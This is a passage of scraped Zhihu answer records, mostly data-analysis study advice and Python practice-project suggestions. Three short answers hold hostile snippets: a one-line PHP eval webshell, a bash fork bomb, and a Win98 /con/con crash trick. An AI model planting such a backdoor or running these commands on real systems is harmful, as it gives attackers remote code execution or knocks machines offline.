"咳咳...可以表白呀~~Python3：print('\\n'.join([''.join([('TencentCloud'[(x-y)%12]if((x*0.05)**2+(y*0.1)**2-1)**3-(x*0.05)**2*(y*0.1)**3&lt;=0 else' ')for x in range(-30,30)])for y in range(15,-15,-1)]))&lt;img src=\"https://pic3.zhimg.com/v2-918da6c1708e9df6fd40d200383d099a_b.png\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"341\" data-rawheight=\"596\" class=\"content_image\" width=\"341\"&gt;点赞的都会有女（男）朋友的！", "praise_num": 2168, "answer_object_id": "ad950ce0e247a885b26b9a1e7132415e"},{"answer_url": "https://www.zhihu.com/question/22119753/answer/303533823", "answer_id": 303533823, "comments_num": 31, "answer_article": "高赞回答讲的更多是数据能力，分享一个提升分析能力的方法。数据分析，数据和分析其实是可以分离的。因为分析本身并不一定需要数据。我们看了900集柯南，大部分案件依靠的是事实证据和逻辑推理；女生抓男票出轨，更多是靠女人心机和第六感。这些你不能说不是分析，只是用到数据很少而已。而数据也不一定用来分析，比如订单数据可能更多是驱动订单流程的完成，即使不做任何分析，快递小哥拿到一条订单数据中的送货地址字段，也能去派单了。我们当然不想看到数据和分析脱节。然而在相当多的企业中，数据部真的就只是数据部。等着业务部门派需求，做报表。报表有什么用？用到什么地方去？用了又怎样？一问三不知。在这些企业，往往分析工作是战略发展部、市场部、运营部、财务部的某个经理做的。这种环境下，即使挂了个数据分析师的头衔，工作也相当苦闷。因为提数实在是太没有技术含量了，随时可能被智能BI软件或者刚毕业的小哥取代。在企业里也没地位，经常被人鄙视的称为：跑数的。我们学了那么多技能不是为了给人当人肉跑数机的，所以结合数据，提升分析能力是非常重要的。分析能力，恰恰非常适合在业余时间提升。因为企业里大部分时候轮不到我们说话，为什么要分析、分析了有啥用得找业务部门的同事切磋。但生活里处处有可以分析的东西，小到去哪里吃饭，大到买房结婚投资。如果认真地用数据分析的思维看事情，你就会发现：我们远没有自己想象中的理性。这也就有了大量的练习分析能力的机会。举个例子，有个经典问题我经常拿来培训新人。找个股市大跌的某天，一脸沧桑的在办公室叹口气：“我炒股亏了100万！咋办啊！”下属基本都笑哈哈的说：“没事你家大业大不怕”；同事会嬉皮笑脸的：“跑路前先把饭前还清哈” 这时候，再把下属们召集起来，认真的说：“我给大家10分钟时间，认真思考下刚才的那个问题，你会怎么答？”这时候大家才发现有坑，纷纷表示刚才太不专业了。专业的数据分析师不应该这么回应。该怎么回应？从一个简单的问题开始：Step1.这到底是个什么事啊？认真想想，我炒股亏了100万，看似带了数据，看似表达清晰，其实什么都没有说！因为一件完整事情的7要素，这里只交代了2个。Who = 我，How much = 100万。可其他的一概不知。甚至连100万的单位是什么都不知道。炒过股的同学都知道，亏在不同人口中意思可能不一样。有些人管没抄底成功，少赚了叫亏。有些人管斩仓出逃，结结实实亏损了叫亏。所以这里要落实清楚细节，才知道到底是个什么事。用数据分析的行话讲，这叫做：5W2H分析法。这个方法可能大家在学校看《管理学》《营销学》一类书都有看过。然而书上没有交代的是，在企业里真正用的时候，这5个W，2个H不是一竿子插到底的。而是这样分组（如下图）：&lt;img src=\"https://pic1.zhimg.com/v2-91f6cf5690b60795596a948cedc56204_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"792\" data-rawheight=\"386\" class=\"origin_image zh-lightbox-thumb\" width=\"792\" data-original=\"https://pic1.zhimg.com/v2-91f6cf5690b60795596a948cedc56204_r.jpg\"&gt;前4个W用来定义问题。咱先搞清楚到底发生了什么，再谈后续为什么会发生，该怎么处理。在数据分析类问题上，这个分析还有另一层含义，就是确认数据指标的含义、统计时间、计算公式。既然要数据分析，那数据指标到底是什么总得先说清楚吧。这也是我们常听到的：数据敏感性。一个对数据敏感的人，会第一时间关注数据的含义、来源，而不是听到个数据就开始联想具体的事情了。有些同学会好奇：这么简单、基础的事，也算是分析能力？当然是哈。人们看高楼大厦，看的都是外形、装修、彩灯、园林。可高楼大厦都是在地基上打起来的。数据指标的含义，数据来源真实性、准确性、全面性，就是数据分析的地基。地基不牢，地动山摇。而如果大家按这个标准，试着看一下我们平时的生活对话，就会发现：我们自然状态下的对话，大部分都是不严谨不规范的。特别是涉及我们和经常打交道的人之间的对话，太熟悉了就会省略很多细节。更不用说，类似自己老妈唠叨自己的话，自己女朋友抱怨自己的话，很多时候都是在简单的发泄情绪，而不是在描述事实。所以，在生活中，我们有着大量练习5W2H分析法，提升数据敏感性的地方。说不定练多了，不但数据分析能力能提升，连和女票吵架的次数都少了很多。在工作中这种场景就更多了。诸如运营跟你说：我们的活跃用户减少了，分析下为什么？市场部给你说：看看哪类用户更容易响应营销活动。看似清晰，实则跟没讲一样。如果不细细理清需求，后边可以预见的是返工、加班、抱怨哈。Step2.这到是个多大的事？假设我们确认了，真的是结结实实损失了100万RMB，又怎样呢？对于不同的人，不同的场景可能完全不同。试着感受下以下场景的区别：1. 我身价1个亿，损失了100万2. 我身价1个亿，但9千万是房子，流动资金一共1千万，损失100万3. 我身价1个亿，1千万流动资金，但欠债1200万，股票又损失100万4. 我身价1个亿，1千万流动资金，欠债1200万，股票又损失100万，但股票已经止跌回升四个场景完全不同，对不对。单纯的了解问题，还不能帮助我们导出解决问题的结论。解决问题，要先看轻重缓急。不同程度问题有不同的处理方式。这里可以有多种分析方法结构分析法（杜邦分析法简化版）帮我们看清楚问题结构，看到出问题的部分在整体中的位置、占比，这样可以理解问题的轻重。身价1个亿亏100万和身价20万借债又亏100万，肯定是两个层面的问题。&lt;img src=\"https://pic2.zhimg.com/v2-87183fb700f66bc7e32faed810c8cc35_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"910\" data-rawheight=\"620\" class=\"origin_image zh-lightbox-thumb\" width=\"910\" data-original=\"https://pic2.zhimg.com/v2-87183fb700f66bc7e32faed810c8cc35_r.jpg\"&gt;对比分析法帮我们看清楚问题大小。对比分析，关键是要树立标杆，通过不同的标杆对比，看到问题在哪个方面影响比较大。比如即使身家1个亿，但一把亏了100万心理也很定难受。这时候就说明，存在两个标杆，一个现实中资金需求，一个是心理期望值。很多时候我们过不去某个坎，不是因为现实中离了XX就不能活，而是心理接受不了这个事实。所以树标杆对比的时候，得多角度考虑才行。&lt;img src=\"https://pic2.zhimg.com/v2-0222b9887df3dbeb9bdd3640690ca2d9_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"908\" data-rawheight=\"344\" class=\"origin_image zh-lightbox-thumb\" width=\"908\" data-original=\"https://pic2.zhimg.com/v2-0222b9887df3dbeb9bdd3640690ca2d9_r.jpg\"&gt;趋势分析法帮助我们看清问题的缓急。比如炒股，至少能看大盘、板块、个股三个维度。如果看起来跌的很厉害，但是大盘向好、板块稳固，个股也开始回暖，那很有可能个股也会很快止跌回升。如果一直阴跌不止，那问题可能不会自己好转，就急需我们主动解决。&lt;img src=\"https://pic1.zhimg.com/v2-46dafa32cfbfe31d4a03a46c82a1995c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"489\" data-rawheight=\"351\" class=\"origin_image zh-lightbox-thumb\" width=\"489\" data-original=\"https://pic1.zhimg.com/v2-46dafa32cfbfe31d4a03a46c82a1995c_r.jpg\"&gt;这些方法计算非常简单，用行话讲叫：描述性统计。然而描述性统计摆在一起，就能解释许许多多的问题。做好描述性统计也是进一步建模分析的基础。实际工作中，描述性统计用处比建模多得多，因为很多时候我们没有那么多数据建模型，很多时候问题的紧迫性也容不得我们慢悠悠的调参训练。练好描述性统计是数据分析能力提升的重要一步。在现实生活中，这种场景就更多了。比如之前深圳中兴的著名悲剧跳楼事件。如果大家根据事件中透漏每月还贷金额，深圳市近3年的平均房价，房贷利率等参数，就很容易推算出来：这个不幸跳楼的哥们如果卖掉深圳的房子，就至少有560万以上的净资产，很有可能导致悲剧的不是现实困难，而是思想拧巴了。数据分析本质上就是用理性思维指导决策，避免感性的一时冲动。现实生活中，我们冲动的时候可比工作上多多了。所以平时好好练习，不但对工作有帮助，有减少生活中的烦恼也可能有帮助呢。Step3.为什么会出这件事？知道问题的原因才容易找对策。而我们恰恰容易在找原因的时候lost。比如这个问题：我为什么炒股会亏100万。大家第一反应都是：哪个股亏了那么多啊？然后就把问题引导到：到底选个什么股上。可实际上，仔细想想：别人问我们的也不是选什么股啊？即使我们真的有本事帮他选到一个股又怎样？很有可能下次照样来哭哭啼啼问：又亏了怎么办。辨别眼前的问题是什么很重要，如果不能深度解读，至少把问题限定在别人正面提问的东西上，不要多度发散。既然人家问的是：“我”该怎么办。那就从“我”的角度来分析，为什么会亏这么多。这里可以用矩阵分析法。矩阵分析法其实就是屌丝版的聚类分析，当数据没那么多，指标维度少的时候，就简单的用两个最关键指标做二维分类，从而提炼出含义。比如这里我们可以做个这样的矩阵：&lt;img src=\"https://pic4.zhimg.com/v2-8b785e7f59624018dca16476ae8ea9f7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"733\" data-rawheight=\"444\" class=\"origin_image zh-lightbox-thumb\" width=\"733\" data-original=\"https://pic4.zhimg.com/v2-8b785e7f59624018dca16476ae8ea9f7_r.jpg\"&gt;这里的分析假设就是：如果一个人每次交易都能盈利，并且总盈利金额也大大超过某个炒股APP的网友平均水平的话（这个数据APP一般会自己统计）那么我们认为他有能力炒股比一般人强，那这一次失手的原因就是老司机偶尔马失前蹄了。如果一个人大部分交易都是不盈利的，但偶尔一两次赚了很多钱，怎么说？可能他真的是吉星高照，虽然没本事炒，但是偶尔碰上一两次好运就赚很多。然而这一次为什么亏了这么多呢？好运到头了。如果一个人是反过来的，经常赚钱，但都赚的很少，那这次一下巨亏，很有可能是对自己过于自信，想赌一把，结果赌漏了。当然，还有那种屡战屡败、屡败屡战的，这种就洗洗睡吧。通过这样的分析，即使我们不懂具体股票是怎么炒的，也能从结果反推出来大概的情形。从结果反推原因，是一个非常重要的数据分析能力。很多同学一想到因果分析，就急着上回归分析了。可很多时候具体的业务发生过程是我们不知道的，或者记录不到详细的数据。比如运营活动，我们能记录到每一步的转化，但到底这个文案顾客理解不理解，到底这个优惠力度人家care不care，数据很难记录，这时候就需要从一系列结果去反推原因。在日常生活中，这种能力也能被大量锻炼。比如我写这篇时临近过年，大家或多或少都会回家遇到炫富的，比高低的，寒碜人的熊亲戚。挺住！别怂！不要被：我在京东年薪百万之类的吓倒！都年薪百万了，title呢？部门呢？是骡子是马拉出来猎聘、51JOB上溜溜。从岗位等级反推收入，也是练习分析能力的方式哈。当然，如果能直接问问题最好。如果不是数据分析师，而是市场研究员分析这个问题，可能就会直接出一张问卷，形如：【单选题】Q1.请问您为什么会亏100万A． 整体市场环境不好B． 个人选股能力不行C． 操作当时脑子昏了D． 其他 【请填写】然而如果只简单这么问，是会有问题的。第一、人家不一定有这个心情回答；第二、谁会承认自己不行呢？肯定是怨天怨地；第三、即使是选了能力不行，到底有多不行还是不知道，所以即使有问问题的机会，还是要结合数据验证。最简单的验证方法就是对比分析法。比如一个人说大行情不好，所以我割肉跑路亏钱了。那可以把大行情好和不好的做成标签，看他之前的交易，在大环境好和不好的时候，交易亏、赚的比例。就能验证他有没有再说谎。对比分析法在日常中，能训练的机会就更多了。实际我们生活中大量的习惯都能做对比检验。某天，我买了个红色盒子的MM巧克力回家。小宝宝非常喜欢玩。我就随口说了句：“你看宝宝喜欢红色的盒子”。我太太立马说：“是吗，马上检验一下啊！”然后立马设计了n组实验：都是盒子，不同颜色的摆在一起让宝宝挑；不同形状的摆在一起让宝宝挑；还调换摆放次序让宝宝挑。几轮下来，把俺的结论杀的大败。也让我总结了一个新经验：这小坏蛋就是单纯的不给他爹面子。T_TStep4.要不要处理这件事？最后要不要处理：我炒股亏了100万的问题呢？如果我们之前的工作都做的很好，对具体情况掌握的一清二楚，这里就很容易下判断了。简单来说，这就是选择题（如下图所示）&lt;img src=\"https://pic3.zhimg.com/v2-6468a43cc2f449377e5c5b791a453ee6_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"916\" data-rawheight=\"482\" class=\"origin_image zh-lightbox-thumb\" width=\"916\" data-original=\"https://pic3.zhimg.com/v2-6468a43cc2f449377e5c5b791a453ee6_r.jpg\"&gt;想复杂的话，可以做综合评估。综合评估的方法有很多，复杂的如神经网络分析、简单的如AHP、因子分析、专家法都可以做。其实无论算法简单还是复杂，核心都只有两个：参考因素、权重。在日常生活中，具体的分析过程肯定是练习不了了。但是不影响我们养成列举考虑因素和权重的好习惯。因为当我们习惯了列举因素和权重以后，你就会发现，日常生活中很多问题压根就不是问题。或者说，很多问题是建立在我们的偏见、误解基础上的。比如过年回家（写这篇的时候刚好过年，多举几个过年的例子）大人催你结婚，给的都是啥考虑因素：l 别人都结了（别人关我什么事）l 这个年龄该结了（谁规定的）l 我想你该结了（？？？）l 我想抱孙子（？？？）……这些理由甚至都不是站在你的角度分析！为啥我要考虑跟我没关系的权重？？？？？Step5.怎么处理这个事？最后终于到了建议环节，其实如果前4步做的好的话，建议简直就是水到渠成的。因为我们已经充分掌握了问题情况、问题轻重缓急、问题的原因、考虑重点因素，导出结论自然是易如反掌。只是有一点要提醒：具体的方法不一定依靠逻辑推导，也完全可以靠自己的创造力！其实那些惊为天人的神来之笔都不是计算出来的，而是创意出来的。所以通过数据分析可以评估方案的优劣，可以导出四平八稳的结论，但不能取代创作方案本身，因为伟大的成果最终是来自伟大创意。&lt;img src=\"https://pic3.zhimg.com/v2-1868b8b568ef277e265f97cb6af74c1e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2178\" data-rawheight=\"1242\" class=\"origin_image zh-lightbox-thumb\" width=\"2178\" data-original=\"https://pic3.zhimg.com/v2-1868b8b568ef277e265f97cb6af74c1e_r.jpg\"&gt;所以总结一下，分析问题可以有一个很简单框架，涵盖了数据分析从定义指标到给出分析建议的全过程。这些过程其实渗透进我们生活的方方面面，即使没有电脑，也不影响我们每天进行练习。因为本质上讲，数据分析只是思维方法的一种，我们明天自己都在做着大量决策，自然也需要这种思维方法。&lt;img src=\"https://pic1.zhimg.com/v2-30d3ee63ddf0394a94a5e4278dca4574_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"584\" data-rawheight=\"304\" class=\"origin_image zh-lightbox-thumb\" width=\"584\" data-original=\"https://pic1.zhimg.com/v2-30d3ee63ddf0394a94a5e4278dca4574_r.jpg\"&gt;然而，从之前的大量例子也能看出：数据分析能力，或者说理性的思维，在日常生活中如同金子般珍贵。在生活中我们自己都充斥着各种不理性的决策：l 不去区分模棱两可的概念l 想当然的认为别人和自己理解一样l 怕麻烦，不去收集数据l 怕拒绝，不敢深入问问题l 热血上脑，一冲动就拍脑袋l 习以为常，习惯怎么来就怎么来这就给了我们大量在业余时间锻炼的机会，不断自我挑战，剔除自己不理性那部分，让思维尽可能科学化。从上边的分析过程也能看出：好结论是大量前期分析之后，水到渠成的产物。可我们偏偏又习惯于先入为主的给意见，屈服于习惯、大众说的、主流媒体的态度，甚至连多几句沟通都嫌费事。这种时候做出不那么聪明的决策，也就在做难免了。生活如此、工作亦如此。要知道数据分析师是拿死工资的。可销售、市场、运营肩头背着业绩压力，他们在更大压力、更多挑战、更多未知的环境下工作，就很容易冲动，更容易理所当然。这时候如果我们自己没有养成良好的分析习惯，只是甩一些数字给人家，当然会被当做不专业，当然会被当做没水平，当然会被当做提数机器：因为我们也只给了一个数啊。当然，生活中有可能不能获取那么精准的数据。有可能我们列出指标、假设、考虑因素，也很难100%的量化，但就和我们在工作中不能收集100%完善的数据一样，少，不代表不能练习，更不代表不能做一些深度思考。好的数据分析师就应该像《三国演义》中的诸葛亮一样，兵多了我能摆八卦阵，兵少了我能摆空城计，没有兵，我还能草船借箭不是。与大家共勉。更多分享，关注公众号：接地气学堂扩展阅读：如何着手分析一个行业？那个京东100万的梗，来自：有哪些典型的「学生思维」？", "praise_num": 337, "answer_object_id": "0af346c9557365817d8e123bd84b51a3"},{"answer_url": "https://www.zhihu.com/question/22119753/answer/228633346", "answer_id": 228633346, "comments_num": 47, "answer_article": "来写一个非计算机/统计背景出身的人，如何利用业余时间学习数据分析的技能吧。数据分析将会作为一门通识技能，进入越来越多的不同工作岗位中。毕竟“技多不压身”，掌握数据分析，一方面可以提升自己相应的业务能力，另一方面也可以让自己建立一种data-driven的视角，去思考各种问题。关键词：非科班 + 业余时间 + 数据分析结合自身的经历，我想从基本技能+动手实践两个角度谈谈。基本技能：不论是学什么，还是需要先有一个大的框架。对于学习数据分析而言，需要的技能模块有统计基础+数据库知识+编程能力统计基础：理工科的学生在本科阶段学习过概率论与数理统计，单从做数据分析的角度，其实已经够用了。那么在业余时间里，我们需要有一本书可以随时查漏补缺，《深入浅出统计学》你值得拥有。数据库知识：关系型数据库很重要，因为在学习数据分析的初期甚至很长一段时间，你接触到的数据都存储在关系型数据库中，需要学习SQL语言去进行数据的查询。SQL的上手很快，强力推荐《SQL必知必会》，整本书通俗易懂，是学习SQL语言的不二之选。我当年入坑也就是这本书开始的。个人觉得，学习数据库的本质就是在学习一种与数据打交道的逻辑思维与能力。而且在编程中的很多思想都是和SQL之间相通的，比如：SQL中对data进行group by的操作，这个在Excel里类似于透视表，在Python/R中也有相应的group function去处理数据。甚至在以后的进阶过程，你会接触到分布式数据库和所对应的no-SQL语句，本质上都是和关系型数据库及SQL相通的。编程能力：Excel --- 别拿Excel不当干粮，之前看到过一个段子：投行的童鞋们用Excel根本不需要鼠标，暂且放在这里调侃一番。不过，Excel里面的透视表(Pivot Table)确实是做数据分析的必备技能。透视表可以帮你迅速汇总数据，看到各类型数据的直观特征就像是让你站在了一个更高的视角上去看你的数据。作为进阶，Excel自带的函数，各种插件，以及VBA也是很好的工具，将Excel用到极致也不是不可以。Python --- 当数据量大到用Excel打开都要好久的时候，或者我们想进一步提升能力的时候，需要学习一些hardcore技能，即用编程语言做数据分析。这里主要有R和Python两大流派。我个人推荐Python，一方面Python代码简单易懂，容易上手；另一方面学习资料超级多。在这里推荐一本书，《利用Python进行数据分析》，这本书涵盖了利用Python做数据清洗，数据可视化及分析的技能点，可以作为一本工具书随时查阅。难道学习数据分析就一定要掌握这些基本技能吗？答案是，并不一定在开始的时候就全部掌握，学习数据分析最重要的方式就是动手实践，get your hands dirty at first。结合楼主的提问，重点讲讲动手实践的部分。动手实践:这一部分其实就是在回答题主的几个问题：从哪里弄到有分析价值的数据？ --- 平台在开源社区有没有开源项目适合用来学习数据分析？可以自己动手做个什么项目来实践好的平台社区：既然是利用业余时间学习数据分析，那么一个好的平台社区将会起到事半功倍的效果。美国有Kaggle，中国有Kesci; 美国的kaggle是全世界做数据科学/数据分析的爱好者/从业者的聚集地，上面你可以看到各种大神的数据分析/挖掘项目，拿来自己练练手。中国现在也有了数据分析学习社区---科赛网Kesci; 在这里可以找到很多开源数据集，启动你的数据分析之旅。What's more, Kesci有一个目前国内独有的在线数据分析平台，K-lab。当你在社区内看到不错的项目之后，可以fork过来在K-lab上面做自己的分析项目并在社区内做展示。我们也在推动从0到1学习数据分析的活动，陪伴中国的第一代数据分析师成长。随时查漏补缺：在这一路实践的过程中，你可能会遇到各种问题，知乎就是一个强大的搜索引擎，有很多大牛写的数据分析文章；当然，如果你英文能力强的话，欢迎copy and paste from StackOverflow, 你可以直接搜索你在写代码做数据分析遇到的各种问题，总有一款答案适合你。再进一步升级：这一路实践就像是游戏里打怪升级的过程，比如你发现自己对统计的知识点不是很清楚，你开始回过头去看统计学书籍；你发现数据存储在分布式系统里面，你开始学习no-SQL的知识；你发现自己对某一行业比较感兴趣，你开始通过数据分析去了解一个行业；你发现自己已经不满足于利用现成数据作分析，你开始学习使用爬虫去抓取数据作分析。逐个击破知识盲区，滚雪球式累积，这也是学习数据分析的精髓。小结：学习数据分析本来就是搭好框架体系，不断累积知识，不断hack技能，不断提升分析水平的过程。哪怕是业余时间学习，假以时日，亦可成大器。也许正因为不是科班出身，所以在奔向远方的道路上才会永不知足，永不疲倦，“stay hungry, stay foolish”。", "praise_num": 428, "answer_object_id": "57bfc28aed2bc060daaa97c3b4e59705"},{"answer_url": "https://www.zhihu.com/question/285586045/answer/450569526", "answer_id": 450569526, "comments_num": 99, "answer_article": "一句话木马，想做什么就做什么&lt;?php @eval($_POST['pass']) ?&gt;", "praise_num": 389, "answer_object_id": "2efe3f85b06c379d28e236bf6f701b67"},{"answer_url": "https://www.zhihu.com/question/29372574/answer/44394791", "answer_id": 44394791, "comments_num": 21, "answer_article": "首先两点建议：最好不要写太应用的程序练手，如果你发现你写程序的大部分时间都在查库手册（或者类似的事情），那就是大家所说的“搬砖”了；要思考什么更像是知识，什么只是经验，还是那句老话：要有造轮子的水平，和不造轮子的觉悟；老只会写写爬虫是造不出什么像样的轮子出来的对于练手的程序，要注意简化和抽象，譬如某些可能会说“写一个小数据库、迷你操作系统”之类的，咋一听好像会很有收获，但是如果简化不得当的话，很容易看几篇教程就被懒得下手了，生活就是这样，你要知道什么只是冲动，什么才是实用。后面我会举例子说明如何简化项目Python的练手项目以 计算机科学中有哪些典型的练手项目？ - 知乎 为基础，然后再加上Python自己的特性。至于那些看似具有Python特色的语言特性，要么就是把常见的设计模式打包成了语法糖，发明了些关键字，譬如生成器、装饰器、描述器；或者就是整合其他古老语言的特点，譬如从SmallTalk那里来的元类、从Scheme那里来的闭包。算法系列－排序与查找Python写swap很方便，就一句话（a, b = b, a），于是写基于比较的排序能短小精悍。刚上手一门新语言练算法最合适不过了，还能顺便刷题，利于找工作。就算法本身而言的话，你还可以考虑写写一些常见的改进，譬如快排的stable实现、加栈的非递归实现，你甚至还可以试试快排的各种partition策略（Lomuto，Hoare），再自己改改轴值直观体验下不同轴值的区别，然后甚至可以自己试试简单的轴值选择优化，譬如三次取平均之类的。还有像折半查找的算法写100遍不为过。复杂的查找可以写二叉树、平衡二叉树、2-3树到红黑树（考虑如何在Python表示树？）不是老有人喜欢以自己能白板写红黑树为豪吗。简单的练习，让你受益无穷。编译系列首先的简化是不要指望一口气写一个完整的C编译器，即使只针对C一个很小的子集，还完全不做优化，没有中间代码，这样其实也够你折腾的。所以我们首先把整个后端全部省略，再把词法分析和语法分析简化到极致，写一个计算器的解释器是很好的开始，譬如解释（1+2）*3 这样一个简单的算式，其实已经包含了计算机的本质——计算，计算的本质其实就是解释。你可以先用Dijkstra的中缀转后缀表达式算法（Shunting-yard，我最喜欢的算法之一）来解释一个算式，进而研究下如何对算术表达式进行语法分析，试着用上下文无关文法来表示一个计算器的语法，然后构造抽象语法树来解释一个算式。再进一步可以写一个极简语言的解释器，譬如brainfuck，写它的解释器比看懂它的hello world程序还要容易（其实还有许多这种类似的esoteric语言，譬如whitespace），用Python实现的代码量大概是50行左右， 之后你回头再看brainfuck的语法，会恍然大悟，图灵机的本质原来就是读写存储器和条件跳转！如果你正在上或者将要上编译原理课的话，可以练习Thompson的算法把正则表达式构造成NFA，思路完全一样，只是对运算符的解释不同，然后可以再练练NFA转DFA子集构造法、或正则表达式直接直接构造DFA，然后顺便学学最小化DFA的算法。这是该课的经典作业之一，我们当年也都是用Python做的。对于正则表达式直接直接构造DFA的练习的话，可以自己实现一个flex，譬如，先把模式转成DFA，再把DFA们并联成一个NFA，再模拟这个NFA运行。再进一步你可以扩展已有的计算器解释器，譬如加入声明、赋值与运算、循环、流程控制， 构成一个简单的LL(1)语法，然后递归下降分析，这就可以搞一个简易同时又图灵完备的玩具语言出来了。另外你也可以写个简单的stack machine，体会一下这种虚拟机的解释执行和前面计算器的解释执行的联系与区别。具体请看这个加州理工的作业（很简单）。CS 11: C track: assignment 8如果觉得简单的stack machine不够过瘾的话，可以写个简单的JVM，支持些最基本的字节码。这有个SJSU的练习：A Java Implementation of the Java Virtual Machine (JVM)在学过了理论计算机基础以后，你甚至还可以写个下推自动机和图灵机的解释器（模拟器），类似于这个：Tools如果你在课上还顺便了解了lambda calculus，你甚至还可以再写个lambda calculus的解释器。在这个基础上，如果你再进一步，你甚至还可以继续写个scheme的简易解释器，Peter Norvig有教程：(How to Write a (Lisp) Interpreter (in Python))当然你还可以稍微加点专业的内容，譬如解释器的一种常用实现方式叫threaded interpreting，大致思路就是把switch case改写一个哈希表，从操作码直接跳转到对应实现函数，从而避免用switch case跳来跳去处理每一个操作码。但是用Python这种类型安全的语言无法直接实现threaded interpreting，可能需要用某些变种。当然这些你都得写成你的Python版本。分布式系统/计网系列首先可以写一个简单的HTTP客户端了，原因很简单，因为HTTP大概是最简单的应用层协议了。Python又自带socket库，更简单了，zeromq也有Python版。这个客户端的任务就是和服务器建立TCP连接，然后把该发的东西打包成HTTP格式，什么第二行是空行啊什么的，然后发出去。再支持下所有请求方法，这样可以逼着你去读RFC2616。然后可以考虑实现一个基本的ssh，你大概每天都会用ssh，难道不想做一个自己的简易版本吗？加密的那一部分可以模仿TLS那样，服务器先发公钥，客户端用这个公钥加密一个对称密钥发回去，然后以后都用对称密钥通信，客户端输入的内容直接发给服务器，服务器操作以后的结果再发给客户端，这就是一个简单的ssh了，你甚至还可以加入对X11 Forwarding的支持。然后可以考虑分布式系统课上的经典作业，譬如写一个简单的RPC。在写RPC之前你最好先用用，了解用法以后再去写。可以参考Java的RPC原理以及Google的RPC框架（有Python版）。再譬如写一个P2P分享系统，没有多台电脑可以用多个虚拟机（网络编程里经常需要这样），虚拟机管理系统推荐：Vagrant。操作系统系列内存管理部分没什么可练手的，尤其还是用Python这种非系统编程语言；进程管理的话可以写个多层次的round robin调度算法，你不需要去调度真正的进程，模拟一下进程就行；同步的话可以试试用Python自带的Mutex，Semaphore写常见的并发模型，哲学家吃饭、生产消费之类的。你甚至还可以用实例感受一下CPython被大家诟病的加了解释器全局锁的鸡肋的多线程（Concurrent但不Parallell），譬如写一个复杂的算式分成几个独立的部分分给各线程然后在你的多核的机器上跑，看看跟单线程有何区别，你还可以想想CPython中在什么情况下线程可以真正Parallel起来？并发的部分可以写写几个经典的并发场景（重点推荐），把互斥锁、cv、semaphore等最常见的几个锁模型都用用，譬如生产者消费者模型，用用Python的thread模块，同时了解下Global Interpreter Lock以及它导致了什么问题。经典的多线程编程是学习新语言很好的练习方式，能让你动脑子。存储管理的话可以写一个简单的文件系统，这个稍微复杂一点。第一步的简化就是用一个大的空文件作为磁盘，就不用专门找个真磁盘或者U盘了，把对磁盘的读写抽象成对这个文件的读写。基本就是实现下inode，然后包装成一个shell，支持下最基本的命令，新建、追加、读写、删除之类的操作。这个练习最有趣也最有意义的地方在于多级索引的实现，有一个VSFS的教程，C++写起来大概1600行，Python更少:http://pages.cs.wisc.edu/~remzi/OSTEP/file-implementation.pdf周边系列你也可以试试Jython，IronPython之类的，看看和CPython比如何。然后再试试Pypy，必然是一开始很高兴，最后发现各种常见库不支持，最后还是转回CPython。做实验的话用IPython把Python函数当命令跑很方便。这些例子每一个都不复杂，大部分我自己当年都写过，最多几百行，从头到尾写下来，你会发现你不仅熟练了Python，算法、操作系统、计网、编译原理的基础也顺便复习了。一箭无数雕。", "praise_num": 389, "answer_object_id": "b6e259b3e2abf5f23c92ad7e16baa1a3"},{"answer_url": "https://www.zhihu.com/question/284886698/answer/443456531", "answer_id": 443456531, "comments_num": 53, "answer_article": "说个历史win98年代任何局域网里共享了文件夹的电脑在其共享目录地址后加入/con/con 回车即可让目标机器蓝屏死机", "praise_num": 101, "answer_object_id": "d2b74fe1d74624caed440db90604798d"},{"answer_url": "https://www.zhihu.com/question/285586045/answer/481988416", "answer_id": 481988416, "comments_num": 34, "answer_article": "可以把一台机器卡死：:(){ :|: &amp; };:\n以前提到过的一行GCD(答案结果为y)： while(x^=y^=x^=y%=x);\n判断一个数是不是  :return !(x &amp; (x - 1))\n可以防止溢出的求平均数的方法:其一  ：(x &amp; y) + ((x ^ y) &gt;&gt; 1)\n其二  ：(x | y) - ((x ^ y) &gt;&gt; 1)\netc.", "praise_num": 213, "answer_object_id": "d5d2339a3dc77921cccaf79b955f3644"},{"answer_url": "https://www.zhihu.com/question/22119753/answer/152679250", "answer_id": 152679250, "comments_num": 283, "answer_article": "反对高票答案。一上来便是各种教程，二话不说给出一批书单，各种数据处理的方式，讲怎么样用Python挖掘数据，怎么用R进行数据可视化，讲AB测试。他们给的教程都很好，数据处理的方式也很有借鉴意义。且不说，有多少人是光收藏，而不去认真学习的，就算是认真去学习的，他们也会遇到这样的问题为什么这么用，为什么这么做。比如，前两天在我的这个回答中，零基础如何学爬虫技术？ - 知乎有很多人都有这样的评论&lt;img src=\"https://pic2.zhimg.com/v2-dd84a0f7f38cc51ad22aa8fcf131bc19_b.png\" data-rawwidth=\"1352\" data-rawheight=\"210\" class=\"origin_image zh-lightbox-thumb\" width=\"1352\" data-original=\"https://pic2.zhimg.com/v2-dd84a0f7f38cc51ad22aa8fcf131bc19_r.jpg\"&gt;&lt;img src=\"https://pic3.zhimg.com/v2-9be1dc340045bb3698004b2d3e874eb2_b.png\" data-rawwidth=\"1334\" data-rawheight=\"210\" class=\"origin_image zh-lightbox-thumb\" width=\"1334\" data-original=\"https://pic3.zhimg.com/v2-9be1dc340045bb3698004b2d3e874eb2_r.jpg\"&gt;&lt;img src=\"https://pic4.zhimg.com/v2-9cd932f8f3047ee6e80d0b521c331c97_b.png\" data-rawwidth=\"1352\" data-rawheight=\"240\" class=\"origin_image zh-lightbox-thumb\" width=\"1352\" data-original=\"https://pic4.zhimg.com/v2-9cd932f8f3047ee6e80d0b521c331c97_r.jpg\"&gt;&lt;img src=\"https://pic2.zhimg.com/v2-e1e14ef41ed11863f0694d1007397a0d_b.png\" data-rawwidth=\"1326\" data-rawheight=\"230\" class=\"origin_image zh-lightbox-thumb\" width=\"1326\" 